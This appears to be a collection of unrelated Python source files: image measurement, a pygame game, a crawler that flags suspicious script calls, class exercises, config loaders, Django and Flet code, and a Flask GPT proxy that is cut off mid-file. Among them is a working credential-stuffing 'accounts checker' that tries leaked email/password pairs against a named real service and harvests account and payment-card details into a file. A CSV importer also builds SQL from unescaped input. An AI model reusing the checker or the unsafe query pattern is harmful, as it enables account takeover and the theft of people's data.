    "\"\"\"\nFilename: init.py\nUsage: This script will measure different objects in the frame using a reference object of known dimension. \nThe object with known dimension must be the leftmost object.\n\"\"\"\nfrom scipy.spatial.distance import euclidean\nfrom imutils import perspective\nfrom imutils import contours\nimport numpy as np\nimport imutils\nimport cv2\n\n# Function to show array of images (intermediate results)\ndef show_images(images):\n\tfor i, img in enumerate(images):\n\t\tcv2.imshow(\"image_\" + str(i), img)\n\tcv2.waitKey(0)\n\tcv2.destroyAllWindows()\n\nimg_path = \"images/example_02.jpg\"\n\n# Read image and preprocess\nimage = cv2.imread(img_path)\n\ngray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\nblur = cv2.GaussianBlur(gray, (9, 9), 0)\n\nedged = cv2.Canny(blur, 50, 100)\nedged = cv2.dilate(edged, None, iterations=1)\nedged = cv2.erode(edged, None, iterations=1)\n\n#show_images([blur, edged])\n\n# Find contours\ncnts = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\ncnts = imutils.grab_contours(cnts)\n\n# Sort contours from left to right as leftmost contour is reference object\n(cnts, _) = contours.sort_contours(cnts)\n\n# Remove contours which are not large enough\ncnts = [x for x in cnts if cv2.contourArea(x) > 100]\n\n#cv2.drawContours(image, cnts, -1, (0,255,0), 3)\n\n#show_images([image, edged])\n#print(len(cnts))\n\n# Reference object dimensions\n# Here for reference I have used a 2cm x 2cm square\nref_object = cnts[0]\nbox = cv2.minAreaRect(ref_object)\nbox = cv2.boxPoints(box)\nbox = np.array(box, dtype=\"int\")\nbox = perspective.order_points(box)\n(tl, tr, br, bl) = box\ndist_in_pixel = euclidean(tl, tr)\ndist_in_cm = 2\npixel_per_cm = dist_in_pixel/dist_in_cm\n\n# Draw remaining contours\nfor cnt in cnts:\n\tbox = cv2.minAreaRect(cnt)\n\tbox = cv2.boxPoints(box)\n\tbox = np.array(box, dtype=\"int\")\n\tbox = perspective.order_points(box)\n\t(tl, tr, br, bl) = box\n\tcv2.drawContours(image, [box.astype(\"int\")], -1, (0, 0, 255), 2)\n\tmid_pt_horizontal = (tl[0] + int(abs(tr[0] - tl[0])/2), tl[1] + int(abs(tr[1] - tl[1])/2))\n\tmid_pt_verticle = (tr[0] + int(abs(tr[0] - br[0])/2), tr[1] + int(abs(tr[1] - br[1])/2))\n\twid = euclidean(tl, tr)/pixel_per_cm\n\tht = euclidean(tr, br)/pixel_per_cm\n\tcv2.putText(image, \"{:.1f}cm\".format(wid), (int(mid_pt_horizontal[0] - 15), int(mid_pt_horizontal[1] - 10)), \n\t\tcv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 0), 2)\n\tcv2.putText(image, \"{:.1f}cm\".format(ht), (int(mid_pt_verticle[0] + 10), int(mid_pt_verticle[1])), \n\t\tcv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 0), 2)\n\nshow_images([image])",
    "import pygame\r\nimport random\r\nimport math\r\nimport time\r\n\r\npygame.init()\r\n\r\n# Create the screen\r\nscreen = pygame.display.set_mode((800, 533))\r\npygame.display.set_caption(\"Spring Girl\")\r\nicon = pygame.image.load(\"candy.png\")\r\npygame.display.set_icon(icon)\r\n\r\n# Load images\r\nbg = pygame.image.load('background.jpg')\r\nimg_girl = pygame.image.load('girl.png')\r\nimg_choco = pygame.image.load('truffle.png')\r\n\r\n# Initialize girl position and movement\r\ngirlx = 320\r\ngirly = 400\r\ngirlx_change = 0\r\n\r\n# Initialize chocolates\r\nchocos = []\r\nnum = 6\r\nfor _ in range(num):\r\n    chocos.append({\r\n        'x': random.randint(1, 675),\r\n        'y': random.randint(1, 150),\r\n        'y_change': 0.1\r\n    })\r\n\r\n# Initialize score\r\nscore_val = 0\r\nfont = pygame.font.Font('freesansbold.ttf', 32)\r\ntextx = 10\r\ntexty = 10\r\n\r\n# Game over font\r\ngame_over_font = pygame.font.Font('freesansbold.ttf', 64)\r\n\r\ndef show_score(x, y):\r\n    score = font.render(\"SCORE: \" + str(score_val), True, (87, 58, 12))\r\n    screen.blit(score, (x, y))\r\n\r\ndef player(x, y):\r\n    screen.blit(img_girl, (x, y))\r\n\r\ndef choco(x, y):\r\n    screen.blit(img_choco, (x, y))\r\n\r\ndef is_collision(girlx, girly, chocox, chocoy):\r\n    distance = math.sqrt((girlx - chocox)**2 + (girly - chocoy)**2)\r\n    return distance < 27\r\n\r\n# Timer function\r\ndef game_timer(start_time):\r\n    elapsed_time = time.time() - start_time\r\n    remaining_time = max(60 - elapsed_time, 0)  # Limit to positive values\r\n    minutes = int(remaining_time // 60)\r\n    seconds = int(remaining_time % 60)\r\n    timer_text = font.render(f\"Time: {minutes:02}:{seconds:02}\", True, (87, 58, 12))\r\n    screen.blit(timer_text, (600, 10))\r\n    return remaining_time\r\n\r\nrunning = True\r\nchoco_fall_delay = 1  # Delay between chocolates falling down\r\nlast_choco_time = time.time()  # To keep track of the last chocolate's time\r\n\r\nstart_time = time.time()  # Start time of the game\r\ngame_over = False\r\n\r\nwhile running:\r\n    screen.fill((0, 0, 255))\r\n    screen.blit(bg, (0, 0))\r\n\r\n    for event in pygame.event.get():\r\n        if event.type == pygame.QUIT:\r\n            running = False\r\n        if event.type == pygame.KEYDOWN:\r\n            if event.key == pygame.K_LEFT:\r\n                girlx_change = -0.3\r\n            if event.key == pygame.K_RIGHT:\r\n                girlx_change = 0.3\r\n        if event.type == pygame.KEYUP:\r\n            if event.key in (pygame.K_LEFT, pygame.K_RIGHT):\r\n                girlx_change = 0\r\n\r\n    girlx += girlx_change\r\n    if girlx <= 2:\r\n        girlx = 2\r\n    elif girlx >= 675:\r\n        girlx = 675\r\n\r\n    if not game_over:\r\n        current_time = time.time()\r\n        # Add a new chocolate if enough time has passed\r\n        if current_time - last_choco_time > choco_fall_delay:\r\n            chocos.append({\r\n                'x': random.randint(1, 675),\r\n                'y': random.randint(1, 150),\r\n                'y_change': 0.1\r\n            })\r\n            last_choco_time = current_time\r\n\r\n        # Update chocolate positions and check for collision\r\n        for choco_info in chocos:\r\n            choco_info['y'] += choco_info['y_change']\r\n            collision = is_collision(girlx, girly, choco_info['x'], choco_info['y'])\r\n            if collision:\r\n                score_val += 1\r\n                choco_info['y'] = random.randint(50, 150)\r\n                choco_info['x'] = random.randint(1, 675)\r\n            choco(choco_info['x'], choco_info['y'])\r\n\r\n        player(girlx, girly)\r\n        show_score(textx, texty)\r\n\r\n        # Check game timer\r\n        remaining_time = game_timer(start_time)\r\n        if remaining_time <= 0:\r\n            game_over = True\r\n\r\n    else:\r\n        # Display game over message\r\n        game_over_text = game_over_font.render(\"GAME OVER\", True, (87, 58, 12))\r\n        screen.blit(game_over_text, (200, 250))\r\n        show_score(300, 350)\r\n\r\n    pygame.display.update()\r\n\r\npygame.quit()\r\n\r\n\r\n    \r\n\r\n",
    "import requests\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import urlparse, urljoin\nfrom tqdm import tqdm\n\nclass Crawler:\n    def __init__(self, start_url, max_depth=3):\n        self.start_url = start_url\n        self.domain = urlparse(start_url).netloc\n        self.max_depth = max_depth\n        self.visited_urls = set()\n        self.headers = {\n            'User-Agent': 'InspectionTool/1.0'\n        }\n        self.found_urls = set()\n\n    def crawl(self):\n        try:\n            with tqdm(total=100) as pbar:\n                self._crawl(self.start_url, depth=0, pbar=pbar)\n        except KeyboardInterrupt:\n            print(\"\\nCrawling process interrupted by user.\")\n\n    def _crawl(self, url, depth, pbar):\n        if depth > self.max_depth or url in self.visited_urls:\n            return\n        try:\n            with requests.get(url, headers=self.headers, allow_redirects=True, stream=True) as response:\n                if response.status_code == 200:\n                    self.visited_urls.add(url)\n                    self._extract_links(response.text, url, depth, pbar)\n                    self._detect_suspicious_code(response.text, url)\n        except Exception as e:\n            print(f\"Error crawling {url}: {e}\")\n\n    def _extract_links(self, html, url, depth, pbar):\n        soup = BeautifulSoup(html, 'html.parser')\n        for link in soup.find_all('a', href=True):\n            href = link['href']\n            if href.startswith('http'):\n                parsed_url = urlparse(href)\n                if parsed_url.netloc == self.domain:\n                    new_url = href\n                else:\n                    continue\n            else:\n                new_url = urljoin(url, href)\n            self.found_urls.add(new_url)\n            self._crawl(new_url, depth + 1, pbar=pbar)\n        if self.found_urls:\n            self._update_progress(pbar)\n\n    def _update_progress(self, pbar):\n        pbar.update(100 / len(self.found_urls))\n\n    def _detect_suspicious_code(self, html, url):\n        soup = BeautifulSoup(html, 'html.parser')\n        script_tags = soup.find_all('script')\n        for script in script_tags:\n            script_content = script.get_text()\n            if 'eval(' in script_content:\n                print(f\"Suspicious code found in {url}: eval() function\")\n            if 'setTimeout(' in script_content:\n                print(f\"Suspicious code found in {url}: setTimeout() function\")\n            if 'setInterval(' in script_content:\n                print(f\"Suspicious code found in {url}: setInterval() function\")\n            if 'document.cookie' in script_content:\n                print(f\"Suspicious code found in {url}: document.cookie usage\")\n\n    def save_found_urls(self, filename='found.txt'):\n        with open(filename, 'w') as f:\n            for url in self.found_urls:\n                f.write(url + '\\n')\n\nif __name__ == \"__main__\":\n    start_url = \"https://example.com/\"  # replace with your starting URL\n    max_depth = 1  # adjust the maximum depth\n    crawler = Crawler(start_url, max_depth)\n    print(\"Starting crawling process...\")\n    crawler.crawl()\n    print(\"Crawling process completed.\")\n    print(\"Saving found URLs to found.txt...\")\n    crawler.save_found_urls()\n    print(\"Found URLs saved to found.txt.\")\n",
    "# Scenario\n# Now we're going to embed the Point class (see Lab 3.4.1.14) inside another class. Also, we're going to put three points into one class, which will let us define a triangle. How can we do it?\n\n# The new class will be called Triangle and this is the list of our expectations:\n\n# the constructor accepts three arguments - all of them are objects of the Point class;\n# the points are stored inside the object as a private list;\n# the class provides a parameterless method called perimeter(), which calculates the perimeter of the triangle described by the three points; the perimeter is a sum of all legs' lengths (we mention it for the record, although we are sure that you know it perfectly yourself.)\n# Complete the template we've provided in the editor. Run your code and check whether the evaluated perimeter is the same as ours.\n\n####################################################################################################################\n\n# Code\n\n# import math\n\n\n# class Point:\n#     #\n#     # The code copied from the previous lab.\n#     #\n\n\n# class Triangle:\n#     def __init__(self, vertice1, vertice2, vertice3):\n#         #\n#         # Write code here\n#         #\n\n#     def perimeter(self):\n#         #\n#         # Write code here\n#         #\n\n\n# triangle = Triangle(Point(0, 0), Point(1, 0), Point(0, 1))\n# print(triangle.perimeter())\n\n############################################################################################################################\n\n# Expected output\n# 3.414213562373095\n\n############################################################################################################################\n\nimport math\n\n\nclass Point:\n    def __init__(self, x=0.0, y=0.0):\n        self.__x = x\n        self.__y = y\n\n    def getx(self):\n        return self.__x\n\n    def gety(self):\n        return self.__y\n\n    def distance_from_xy(self, x, y):\n        return math.hypot(self.__x - x, self.__y - y)\n\n    def distance_from_point(self, point):\n        return math.hypot(self.__x - point.getx(), self.__y - point.gety())\n\n\nclass Triangle:\n    def __init__(self, vertice1, vertice2, vertice3):\n        self.__sideA = math.hypot(\n            vertice1.getx() - vertice2.getx(), vertice1.gety() - vertice2.gety()\n        )\n        self.__sideB = math.hypot(\n            vertice2.getx() - vertice3.getx(), vertice2.gety() - vertice3.gety()\n        )\n        self.__sideC = math.hypot(\n            vertice3.getx() - vertice1.getx(), vertice3.gety() - vertice1.gety()\n        )\n\n    def perimeter(self):\n        return self.__sideA + self.__sideB + self.__sideC\n\n\ntriangle = Triangle(Point(0, 0), Point(1, 0), Point(0, 1))\nprint(triangle.perimeter())\n",
    "import yaml\nimport dotenv\nfrom pathlib import Path\n\nconfig_dir = Path(__file__).parent.parent.resolve() / \"config\"\n\nwith open(config_dir / \"config.yml\", 'r') as f:\n    config_yaml = yaml.safe_load(f)\n\n\nconfig_env = dotenv.dotenv_values(config_dir / \"config.env\")\n\nOPENAI_COMPLETION_OPTIONS = config_yaml[\"OPENAI_COMPLETION_OPTIONS\"]\ntelegram_token = config_yaml[\"telegram_token\"]\nopenai_api_key = config_yaml[\"openai_api_key\"]\nopenai_api_base = config_yaml.get(\"openai_api_base\", None)\nallowed_telegram_usernames = config_yaml[\"allowed_telegram_usernames\"]\nnew_dialog_timeout = config_yaml[\"new_dialog_timeout\"]\nenable_message_streaming = config_yaml.get(\"enable_message_streaming\", True)\nreturn_n_generated_images = config_yaml.get(\"return_n_generated_images\", 1)\nimage_size = config_yaml.get(\"image_size\", \"512x512\")\nn_chat_modes_per_page = config_yaml.get(\"n_chat_modes_per_page\", 5)\nmongodb_url = f\"mongodb://mongo:{config_env['MONGODB_PORT']}\"\n\n\nwith open(config_dir / \"chat_modes.yml\", 'r') as f:\n    chat_modes = yaml.safe_load(f)\n\n# models\nwith open(config_dir / \"models.yml\", 'r') as f:\n    models = yaml.safe_load(f)\n\n# files\nhelp_group_chat_video_path = Path(__file__).parent.parent.resolve() / \"static\" / \"help_group_chat.mp4\"\n",
    "import flet as ft\r\n\r\ndef main(page: ft.Page):\r\n    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER\r\n    page.vertical_alignment_alignment = ft.MainAxisAlignment.CENTER\r\n    page.window_min_width = 500\r\n    page.bgcolor = ft.colors.BLACK\r\n\r\n    image = ft.Container(\r\n        expand=all,\r\n        width=350,\r\n        height=250,\r\n        clip_behavior=ft.ClipBehavior.NONE,\r\n        border_radius=ft.border_radius.vertical(top=20),\r\n        gradient=ft.LinearGradient(\r\n            begin=ft.alignment.bottom_left,\r\n            end=ft.alignment.top_right,\r\n            colors=[ft.colors.PURPLE_400, ft.colors.SURFACE],\r\n        ),\r\n        content=ft.Image(\r\n            src = 'https://www.clashroyaledicas.com/wp-content/uploads/2016/02/bruxa-do-clash-royale-render-3d-witch.png',\r\n            scale=ft.Scale(scale=1.15),\r\n        )\r\n\r\n    )\r\n\r\n    info = ft.Container(\r\n        expand=2,\r\n        padding=ft.padding.all(10),\r\n        alignment=ft.alignment.center,\r\n        content= ft.Column(\r\n            horizontal_alignment=ft.CrossAxisAlignment.CENTER,\r\n            controls=[\r\n                ft.Text(value='LEVEL 3', color=ft.colors.PURPLE_ACCENT),\r\n                ft.Text(\r\n                    value='Bruxa',\r\n                    weight=ft.FontWeight.BOLD,\r\n                    size=30,\r\n                    color=ft.colors.BLACK\r\n                ),\r\n                ft.Text(\r\n                    value='Esta criatura morta-viva representa pouca amea\u00e7a por si s\u00f3. Mas nunca luta sozinho, uma vez que a bruxa pode convocar uma horda infinita de esqueletos contra o seu inimigo!',\r\n                    color=ft.colors.GREY,\r\n                    text_align=ft.TextAlign.CENTER,\r\n                    )\r\n            ]\r\n        )\r\n    )\r\n    skills = ft.Container(\r\n        expand=1,\r\n        bgcolor=ft.colors.PURPLE_900,\r\n        padding=ft.padding.symmetric(horizontal=10),\r\n        border_radius=ft.border_radius.vertical(bottom=20),\r\n        content=ft.Row(\r\n            controls=[\r\n                ft.Column(\r\n                    expand=1,\r\n                    horizontal_alignment=ft.CrossAxisAlignment.CENTER,\r\n                    alignment=ft.MainAxisAlignment.CENTER,\r\n                    controls=[\r\n                        ft.Text(\r\n                            value='150',\r\n                            color=ft.colors.WHITE,\r\n                            weight=ft.FontWeight.BOLD,\r\n                            size=40\r\n                        ),\r\n                        ft.Text(\r\n                            value='DEFESA',\r\n                            color=ft.colors.WHITE,\r\n                        )\r\n                    ]\r\n                ),\r\n                ft.VerticalDivider(opacity=0.5),\r\n\r\n                ft.Column(\r\n                    expand=1,\r\n                    horizontal_alignment=ft.CrossAxisAlignment.CENTER,\r\n                    alignment=ft.MainAxisAlignment.CENTER,\r\n                    controls=[\r\n                        ft.Text(\r\n                            value='20',\r\n                            color=ft.colors.WHITE,\r\n                            weight=ft.FontWeight.BOLD,\r\n                            size=40\r\n                        ),\r\n                        ft.Text(\r\n                            value='VELOCIDADE',\r\n                            color=ft.colors.WHITE,\r\n                        )\r\n                    ]\r\n                ),\r\n                ft.VerticalDivider(opacity=0.5),\r\n\r\n                ft.Column(\r\n                    expand=1,\r\n                    horizontal_alignment=ft.CrossAxisAlignment.CENTER,\r\n                    alignment=ft.MainAxisAlignment.CENTER,\r\n                    controls=[\r\n                        ft.Text(\r\n                            value='70',\r\n                            color=ft.colors.WHITE,\r\n                            weight=ft.FontWeight.BOLD,\r\n                            size=40\r\n                        ),\r\n                        ft.Text(\r\n                            value='DANO',\r\n                            color=ft.colors.WHITE,\r\n                        )\r\n                    ]\r\n                ),\r\n            ]\r\n        )\r\n    )\r\n \r\n    layout = ft.Container(\r\n        height=600,\r\n        width=350,\r\n        shadow=ft.BoxShadow(blur_radius=100, color=ft.colors.PURPLE_ACCENT),\r\n        clip_behavior=ft.ClipBehavior.NONE,\r\n        border_radius=ft.border_radius.all(30),\r\n        bgcolor=ft.colors.WHITE,\r\n        content=ft.Column(\r\n            spacing=0,\r\n            controls=[\r\n                image,\r\n                info,\r\n                skills,\r\n            ]\r\n        )\r\n    )\r\n\r\n    page.add(layout)\r\n\r\nif __name__ == \"__main__\":\r\n    ft.app(target = main)",
    "import sys\nimport csv\nimport time\nimport mysql.connector as mysql\n\nclass CSVToMySQLImporter:\n    def __init__(self):\n        if len(sys.argv) < 2 or sys.argv[1] == '--help':\n            self.show_help()\n        else:\n            try:\n                args = self.parse_args(sys.argv[1:])\n                self.connect_to_mysql(args)\n\n                file_info = input(\"Alright, tell me about the CSV file (file=yourfile.csv columns=0 delimiter=, table=yourtable): \")\n\n                file_args = self.parse_args(file_info.split())\n                filename = file_args.get('file')\n                columns = int(file_args.get('columns', 0))\n                delimiter = file_args.get('delimiter', ',')\n                table = file_args.get('table', filename.split('.')[0])\n\n                self.import_csv(filename, delimiter, columns, table)\n\n            except Exception as e:\n                print(f\"Yikes! Something went wrong: {e}\")\n                sys.exit(1)\n\n    def parse_args(self, args):\n        \"\"\"Parse arguments and return them as a dictionary.\"\"\"\n        return dict(arg.split('=') for arg in args)\n\n    def show_help(self):\n        print(\"\"\"\n        ******************************************\n        Super Easy CSV to MySQL Importer (Casual Edition)\n        ******************************************\n\n        How to use this cool tool:\n\n        1. Open your terminal or command prompt.\n        2. Type `python CSVToMySQLImporter.py host=your_mysql_host un=your_username pw=your_password db=your_database`\n           (Replace those placeholders with your actual MySQL info.)\n        3. When prompted, tell me about your CSV file using this format:\n           `file=yourfile.csv columns=0 delimiter=, table=yourtable`\n\n        Here's what those things mean:\n          - file: The path to your awesome CSV file.\n          - columns (optional): The line number with column headings (defaults to 0, the first line).\n          - delimiter (optional): The character that separates values in your CSV (defaults to comma ',').\n          - table: The name of the table you want to create and fill with data.\n\n        That's it! Let the data flow!\n        \"\"\")\n\n    def connect_to_mysql(self, args):\n        \"\"\"Connect to the MySQL database using provided credentials.\"\"\"\n        try:\n            self.db = mysql.connect(\n                host=args.get('host'),\n                user=args.get('un'),\n                password=args.get('pw'),\n                database=args.get('db')\n            )\n            self.cursor = self.db.cursor()\n            print(\"Connected to MySQL database!\")\n        except mysql.Error as e:\n            print(f\"Unable to connect to MySQL: {e}\")\n            sys.exit(1)\n\n    def import_csv(self, filename, delimiter, columns, table):\n        \"\"\"Import CSV file to MySQL database.\"\"\"\n        try:\n            with open(filename, 'r', newline='') as csv_file:\n                csv_reader = csv.reader(csv_file, delimiter=delimiter)\n\n                for _ in range(columns):\n                    next(csv_reader)\n                column_headers = next(csv_reader)\n                column_definitions = ', '.join(f\"{col} VARCHAR(255)\" for col in column_headers)\n\n                table_name = table.replace('-', '_')\n                create_table_query = f\"CREATE TABLE IF NOT EXISTS {table_name} (id INT AUTO_INCREMENT, {column_definitions}, PRIMARY KEY (id))\"\n                self.cursor.execute(create_table_query)\n\n                insert_query = f\"INSERT INTO {table_name} ({', '.join(column_headers)}) VALUES ({', '.join(['%s'] * len(column_headers))})\"\n\n                start_time = time.time()\n                for row in csv_reader:\n                    cleaned_row = [self.clean_value(value) for value in row]\n                    self.cursor.execute(insert_query, cleaned_row)\n\n                self.db.commit()\n\n                end_time = time.time()\n                print(\"\\nData import successful!\")\n                print(f\"Time taken: {end_time - start_time:.2f} seconds\")\n\n        except Exception as e:\n            print(f\"Error during import: {e}\")\n            self.db.rollback()\n\n        finally:\n            self.cursor.close()\n            self.db.close()\n\n    @staticmethod\n    def clean_value(value):\n        \"\"\"Clean and strip values.\"\"\"\n        return value.strip().replace('\"', '')\n\n\nif __name__ == \"__main__\":\n    CSVToMySQLImporter()\n",
    "from itertools import filterfalse\n\n\ndef unique_everseen(iterable, key=None):\n    \"List unique elements, preserving order. Remember all elements ever seen.\"\n    # unique_everseen('AAAABBBCCDAABBB') --> A B C D\n    # unique_everseen('ABBCcAD', str.lower) --> A B C D\n    seen = set()\n    seen_add = seen.add\n    if key is None:\n        for element in filterfalse(seen.__contains__, iterable):\n            seen_add(element)\n            yield element\n    else:\n        for element in iterable:\n            k = key(element)\n            if k not in seen:\n                seen_add(k)\n                yield element\n\n\n# copied from more_itertools 8.8\ndef always_iterable(obj, base_type=(str, bytes)):\n    \"\"\"If *obj* is iterable, return an iterator over its items::\n\n        >>> obj = (1, 2, 3)\n        >>> list(always_iterable(obj))\n        [1, 2, 3]\n\n    If *obj* is not iterable, return a one-item iterable containing *obj*::\n\n        >>> obj = 1\n        >>> list(always_iterable(obj))\n        [1]\n\n    If *obj* is ``None``, return an empty iterable:\n\n        >>> obj = None\n        >>> list(always_iterable(None))\n        []\n\n    By default, binary and text strings are not considered iterable::\n\n        >>> obj = 'foo'\n        >>> list(always_iterable(obj))\n        ['foo']\n\n    If *base_type* is set, objects for which ``isinstance(obj, base_type)``\n    returns ``True`` won't be considered iterable.\n\n        >>> obj = {'a': 1}\n        >>> list(always_iterable(obj))  # Iterate over the dict's keys\n        ['a']\n        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit\n        [{'a': 1}]\n\n    Set *base_type* to ``None`` to avoid any special handling and treat objects\n    Python considers iterable as iterable:\n\n        >>> obj = 'foo'\n        >>> list(always_iterable(obj, base_type=None))\n        ['f', 'o', 'o']\n    \"\"\"\n    if obj is None:\n        return iter(())\n\n    if (base_type is not None) and isinstance(obj, base_type):\n        return iter((obj,))\n\n    try:\n        return iter(obj)\n    except TypeError:\n        return iter((obj,))\n",
    "from django.shortcuts import render\r\nfrom django.contrib.auth.models import User\r\nfrom rest_framework import generics\r\nfrom .serializers import UserSerializer,NoteSerializer\r\nfrom rest_framework.permissions import IsAuthenticated,AllowAny\r\nfrom .models import Note\r\n\r\nclass NoteListCreate(generics.ListCreateAPIView):\r\n    serializer_class=NoteSerializer\r\n    permission_classes=[IsAuthenticated]\r\n    def get_queryset(self):\r\n        user=self.request.user\r\n        return Note.objects.filter(author=user)\r\n    def perform_create(self,serializer):\r\n        if serializer.is_valid():\r\n            serializer.save(author=self.request.user)\r\n        else:\r\n            print(serializer.errors)\r\n\r\nclass NoteDelete(generics.DestroyAPIView):\r\n    serializer_class=NoteSerializer\r\n    permission_classes=[IsAuthenticated]\r\n    def get_queryset(self):\r\n        user=self.request.user\r\n        return Note.objects.filter(author=user)\r\n    \r\n\r\nclass CreateUserView(generics.CreateAPIView):\r\n    queryset=User.objects.all()\r\n    serializer_class=UserSerializer\r\n    permission_classes=[AllowAny]\r\n",
    "import requests\nimport json\nimport random\nimport time\nfrom fake_useragent import UserAgent\nfrom colorama import init, Fore\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\ninit(autoreset=True)\n\ndef login_and_check_cards(email, password):\n    url = 'https://beta.api.datawagon.com/api/login'\n    ua = UserAgent()\n    headers = {\n        'Accept': 'application/json, text/plain, */*',\n        'Content-Type': 'application/json;charset=UTF-8',\n        'Origin': 'https://beta.cloud.datawagon.com',\n        'Referer': 'https://beta.cloud.datawagon.com/',\n        'User-Agent': ua.random\n    }\n    data = {\n        \"loading\": False,\n        \"email\": email,\n        \"password2\": password,\n        \"errors\": {}\n    }\n\n    response = requests.post(url, headers=headers, json=data, verify=False)\n\n    if 'result\":\"success' in response.text:\n        json_data = response.json()\n        user = json_data['user']\n        userid = user['userid']\n        firstname = user['firstname']\n        lastname = user['lastname']\n        credit = user['credit']\n        currency = user['currency_code']\n        country = user['country']\n        twofa_enabled = user['twofaenabled']\n        status = user['status']\n        token = json_data['token']\n        \n        getcard = 'https://beta.api.datawagon.com/api/billing/card'\n        getcardheaders = {\n            'Accept': 'application/json, text/plain, */*',\n            'Content-Type': 'application/json;charset=UTF-8',\n            'Origin': 'https://beta.cloud.datawagon.com',\n            'Referer': 'https://beta.cloud.datawagon.com/',\n            'Authorization': 'Bearer ' + token,\n            'User-Agent': ua.random\n        }\n        getcarddata = requests.get(getcard, headers=getcardheaders, verify=False)\n        cards = getcarddata.json().get('paymethods', [])  \n\n        with open('validaccs.txt', 'a') as valid_file:\n            valid_file.write(f'Email: {email}\\n')\n            valid_file.write(f'Password: {password}\\n')\n            valid_file.write(f'UserID: {userid} | Firstname: {firstname} | Lastname: {lastname}\\n')\n            valid_file.write(f'Account Credit: {credit} {currency} | Country: {country} | 2FA Enabled: {twofa_enabled} | Account Status: {status}\\n')\n            if cards:\n                for index, card in enumerate(cards, start=1):\n                    cardid = card['card_last_four']\n                    expiry = card['expiry_date']\n                    cardtype = card['card_type']\n                    valid_file.write(f'Card {index}: [ Card ID: {cardid} | Expiry: {expiry} | Card Type: {cardtype} ]\\n')\n            else:\n                valid_file.write(\"NO PAYMENT METHOD\\n\")\n            valid_file.write('\\n') \n        print(f'[ {Fore.GREEN}VALID ACCOUNT - {email}|{password}{Fore.RESET} | {Fore.YELLOW}UserID: {userid} - Firstname: {firstname} - Lastname: {lastname} - Account Credit: {credit} {currency} - Country: {country} - 2FA Enabled: {Fore.GREEN if twofa_enabled else Fore.RED}{twofa_enabled}{Fore.RESET}{Fore.YELLOW} - Account Status: {Fore.GREEN if status == \"Active\" else Fore.RED}{status}{Fore.RESET} ]')\n        \n    elif 'auth\":\"We' in response.text:\n        with open('invalidaccs.txt', 'a') as invalid_file:\n            invalid_file.write(f'Invalid Account: {email}\\n\\n')\n        print(f'[{Fore.RED} INVALID ACCOUNT - {email}|{password} {Fore.RESET}]')\n        \n    else:\n        print(f'[{Fore.RED} ERROR - YOUR IP BLOCKED OR HOST DOWN {Fore.RESET}]')\n        \n    time.sleep(random.uniform(1, 5))\n\ndef main():\n    banner = \"\"\"\n\u00b7\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u00b7 \u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u00b7 \u2584\u2584\u258c \u2590 \u2584\u258c \u2584\u2584\u2584\u00b7  \u2584\u2584 \u2022        \u2590 \u2584 \n\u2588\u2588\u25aa \u2588\u2588 \u2590\u2588 \u2580\u2588 \u2022\u2588\u2588  \u2590\u2588 \u2580\u2588 \u2588\u2588\u00b7 \u2588\u258c\u2590\u2588\u2590\u2588 \u2580\u2588 \u2590\u2588 \u2580 \u25aa\u25aa     \u2022\u2588\u258c\u2590\u2588\n\u2590\u2588\u00b7 \u2590\u2588\u258c\u2584\u2588\u2580\u2580\u2588  \u2590\u2588.\u25aa\u2584\u2588\u2580\u2580\u2588 \u2588\u2588\u25aa\u2590\u2588\u2590\u2590\u258c\u2584\u2588\u2580\u2580\u2588 \u2584\u2588 \u2580\u2588\u2584 \u2584\u2588\u2580\u2584 \u2590\u2588\u2590\u2590\u258c\n\u2588\u2588. \u2588\u2588 \u2590\u2588 \u25aa\u2590\u258c \u2590\u2588\u258c\u00b7\u2590\u2588 \u25aa\u2590\u258c\u2590\u2588\u258c\u2588\u2588\u2590\u2588\u258c\u2590\u2588 \u25aa\u2590\u258c\u2590\u2588\u2584\u25aa\u2590\u2588\u2590\u2588\u258c.\u2590\u258c\u2588\u2588\u2590\u2588\u258c\n\u2580\u2580\u2580\u2580\u2580\u2022  \u2580  \u2580  \u2580\u2580\u2580  \u2580  \u2580  \u2580\u2580\u2580\u2580 \u2580\u25aa \u2580  \u2580 \u00b7\u2580\u2580\u2580\u2580  \u2580\u2588\u2584\u2580\u25aa\u2580\u2580 \u2588\u25aa\n    \"\"\"\n    print(Fore.CYAN + banner + Fore.RESET)\n    print(Fore.YELLOW + \"Github.com/im-hanzou | DataWagon Accounts Checker\\n\" + Fore.RESET)\n    filename = input(Fore.MAGENTA + \"Your credentials file (\" + Fore.RED +\"format: email|password\" + Fore.MAGENTA + \"): \" + Fore.RESET)\n    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:\n        for line in file:\n            parts = line.strip().split('|')\n            if len(parts) < 2:\n                print(f\"{Fore.RED}[ Invalid format in line: {line.strip()} ]{Fore.RESET}\")\n                continue\n            email = parts[0]\n            password = '|'.join(parts[1:])\n            login_and_check_cards(email, password)\n\nif __name__ == \"__main__\":\n    main()\n",
    "from flask import Flask, request, Response, jsonify, render_template, send_from_directory\nimport requests\nimport json\nimport os\nimport dotenv\ndotenv.load_dotenv()\n\nopenai_api_base_url = os.environ['OPENAI_API_BASE_URL']\nopenai_api_key = os.environ['OPENAI_API_KEY']\nprompt = os.environ['PROMPT']\n\napp = Flask(__name__)\n\n\ndriver_messages = []\n\ndef find_driver_message(driver) -> list:\n    for message in driver_messages:\n        if message['driver'] == driver:\n            # \u5224\u65ad\u5185\u5bb9\u662f\u5426\u5927\u4e8e8000\u5b57\u7b26\n            if len(message['messages']) < 8000:\n                return message['messages']\n    message = {\n        'driver': driver,\n        'messages': [\n            {\n                'role': 'system',\n                'content': prompt\n            }\n        ]\n    }\n    driver_messages.append(message)\n    return message['messages']\n            \ndef save_driver_message(driver, res_message):\n    for message in driver_messages:\n        if message['driver'] == driver:\n            message['messages'].append(res_message)\n            print('res message: ', res_message)\n            return\n\ndef send_text_to_gpt(messages):\n    while True:\n        url = f'{openai_api_base_url}/chat/completions'\n        payload = json.dumps({\n            \"model\": \"gpt-3.5-turbo\",\n            \"messages\": messages,\n            